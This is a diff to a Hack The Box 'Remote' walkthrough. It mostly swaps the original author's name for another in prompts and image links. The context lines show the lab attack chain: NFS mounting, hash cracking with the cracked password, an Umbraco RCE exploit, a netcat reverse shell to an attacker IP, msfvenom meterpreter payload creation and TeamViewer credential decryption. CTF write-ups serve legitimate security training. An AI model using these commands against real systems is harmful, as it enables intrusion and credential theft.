@@ -9,6 +9,7 @@ avatar: assets/htb/remote.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Remote
 ---
+
 ## Overview
 
 TODO: finish writeup, add images, clean up...wow my notes were bad on this one!
@@ -89,7 +90,7 @@ Port 21 for FTP was open so I tried to login  using anonymous access. I was able
 
 ### Port 80 - HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-http80.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-http80.png)
 
 Acme widgets product page
 
@@ -335,17 +336,17 @@ Dirbuster found a huge list of standard Umbraco directories and files, as well a
 
 A search for Umbraco vulnerabilities led me to [https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/](https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/) which described a way to get remote code execution.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-codeeditor.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-codeeditor.png)
 
 This led me to the page  `http://<YOUR_IP>/umbraco/webservices/codeEditorSave.asmx`, which should not exist on the production server.  
 
 [https://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html](https://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-notvulnerable.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-notvulnerable.png)
 
 rabbit hole?^
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-umbraco.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-umbraco.png)
 
 Navigating to `/umbraco` redirected me to a login page at `http:<YOUR_IP>/umbraco/#/login.asp`.
 
@@ -358,19 +359,19 @@ since rpc is open and showing mountd service on port 2049:
 * [https://resources.infosecinstitute.com/exploiting-nfs-share](https://resources.infosecinstitute.com/exploiting-nfs-share)
 
 ```text
-zweilos@kali:~/htb/remote$ showmount -e <YOUR_IP>
+kac0@kali:~/htb/remote$ showmount -e <YOUR_IP>
 Export list for <YOUR_IP>:
 /site_backups (everyone)
 
-zweilos@kali:~/htb/remote$ mkdir /tmp/remote
-zweilos@kali:~/htb/remote$ sudo mount -t nfs <YOUR_IP>:/site_backups /tmp/remote
+kac0@kali:~/htb/remote$ mkdir /tmp/remote
+kac0@kali:~/htb/remote$ sudo mount -t nfs <YOUR_IP>:/site_backups /tmp/remote
 ```
 
 Using the `showmount -e` command I was able to export the folders that were available to connect to, and list who could connect.  This share was available for everyone.  I obliged myself to the open share and mounted it to a local folder using the `mount` command.
 
 ```text
-zweilos@kali:~$ cd /tmp/remote
-zweilos@kali:~$ df -k
+kac0@kali:~$ cd /tmp/remote
+kac0@kali:~$ df -k
 Filesystem                 1K-blocks     Used Available Use% Mounted on
 udev                         4033876        0   4033876   0% /dev
 tmpfs                         812860     1156    811704   1% /run
@@ -380,7 +381,7 @@ tmpfs                           5120        0      5120   0% /run/lock
 tmpfs                        4064284        0   4064284   0% /sys/fs/cgroup
 tmpfs                         812856       28    812828   1% /run/user/1000
 <YOUR_IP>:/site_backups  31119360 12312576  18806784  40% /tmp/remote
-zweilos@kali:/tmp/remote$ ls -la                                                                     
+kac0@kali:/tmp/remote$ ls -la                                                                     
 total 123                                                                                               
 drwx------  2 nobody 4294967294  4096 Feb 23 13:35 . 
 drwxrwxrwt 25 root   root        4096 Jul  5 12:01 ..
@@ -405,16 +406,16 @@ After mounting the folder locally I was able to browse through the files at my l
 
 * [https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data](https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-umbraco-sdf.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-umbraco-sdf.png)
 
 In the `App_Data/` folder there was supposed to be a `.sdf` file it seemed.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-creds.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-creds.png)
 
 There was indeed a `.sdf` file, creatively named: `umbraco.sdf`.  This was a "standard database format" file, but I was still able to extract the data I needed using `vim`.  There was information for a few different users, including email addresses and password hashes.  I extracted the password hashes and sent them to hashcat for cracking.  
 
 ```text
-zweilos@kali:~/htb/remote$ hashcat -O -D1,2 -a0 -m100 hashes /usr/share/wordlists/rockyou.txt
+kac0@kali:~/htb/remote$ hashcat -O -D1,2 -a0 -m100 hashes /usr/share/wordlists/rockyou.txt
 hashcat (v6.1.1) starting...
 
 Hashes: 1 digests; 1 unique digests, 1 unique salts
@@ -467,15 +468,15 @@ Stopped: Sun Feb 21 18:57:12 2021
 
 The hash `b8be16afba8c314ad33d812f22a04991b90e2aaa` for the `admin` user cracked with the password `baconandcheese`.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-friendly-cms.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-friendly-cms.png)
 
 after logging in
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-user-cleanup.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-user-cleanup.png)
 
 Lots of people were using this portal to try to gain access or run enumeration files it seemed. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-ssmith.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-ssmith.png)
 
 ### Umbraco 7.12.4 Remote Code Exploit
 
@@ -555,14 +556,14 @@ print(CMDOUTPUT)
 exploit.py
 
 ```text
-zweilos@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://<YOUR_IP> -c whoami
+kac0@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://<YOUR_IP> -c whoami
 iis apppool\defaultapppool
 ```
 
 it worked. now it was time to enumerate the system \(very slow however\)
 
 ```text
-zweilos@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://<YOUR_IP> -c powershell.exe -a '-NoProfile -Command ls'
+kac0@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://<YOUR_IP> -c powershell.exe -a '-NoProfile -Command ls'
 
     Directory: C:\windows\system32\inetsrv
 
@@ -592,7 +593,7 @@ d-r---        2/20/2020   2:42 AM                Public
 ```
 
 ```text
-zweilos@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://<YOUR_IP> -c powershell.exe -a '-NoProfile -Command ping 10.10.15.82'
+kac0@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://<YOUR_IP> -c powershell.exe -a '-NoProfile -Command ping 10.10.15.82'
 
 Pinging 10.10.15.82 with 32 bytes of data:
 Reply from 10.10.15.82: bytes=32 time=46ms TTL=63
@@ -615,7 +616,7 @@ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://<YOUR_IP> -c p
 got a hit on my host
 
 ```text
-zweilos@kali:~$ python -m SimpleHTTPServer 8090
+kac0@kali:~$ python -m SimpleHTTPServer 8090
 Serving HTTP on 0.0.0.0 port 8090 ...
 <YOUR_IP> - - [05/Jul/2020 20:28:42] "GET /nc32.exe HTTP/1.1" 200 -
 ```
@@ -623,7 +624,7 @@ Serving HTTP on 0.0.0.0 port 8090 ...
 once nc.exe was on the box could now get a shell with:
 
 ```text
-zweilos@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://<YOUR_IP> -c powershell.exe -a 'C:\\Windows\\Temp\\n.exe 10.10.15.82 9990 -e powershell.exe'
+kac0@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://<YOUR_IP> -c powershell.exe -a 'C:\\Windows\\Temp\\n.exe 10.10.15.82 9990 -e powershell.exe'
 ```
 
 ## Road to User
@@ -680,7 +681,7 @@ didnt realize for a long time that I already was logged in as a user with access
 ```text
 PS C:\Users\Public> type user.txt
 type user.txt
-2224****e36a
+2224************************e36a
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -759,7 +760,7 @@ print(password)
 using the python exploit to decrypt the password stored in the reg key I found
 
 ```text
-zweilos@kali:~/htb/remote$ python3 teamviewer-pass.py 
+kac0@kali:~/htb/remote$ python3 teamviewer-pass.py 
 00000000: 72 00 33 00 6D 00 30 00  74 00 65 00 5F 00 4C 00  r.3.m.0.t.e._.L.
 00000010: 30 00 67 00 69 00 6E 00  00 00 00 00 00 00 00 00  0.g.i.n.........
 None
@@ -775,7 +776,7 @@ So I will need a meterpreter session
 ### Getting a shell
 
 ```text
-zweilos@kali:~$ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.15.82 LPORT=4444 -f exe -o rev.exe
+kac0@kali:~$ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.15.82 LPORT=4444 -f exe -o rev.exe
 ```
 
 sending msfvenom payload to remote system
@@ -818,5 +819,5 @@ meterpreter > run post/windows/gather/credentials/teamviewer_passwords
 
 ```text
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-ed57****a77d
+ed57************************a77d
 ```
